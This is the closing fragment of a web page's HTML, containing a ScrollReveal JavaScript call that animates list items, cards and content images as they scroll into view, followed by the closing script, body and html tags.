                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>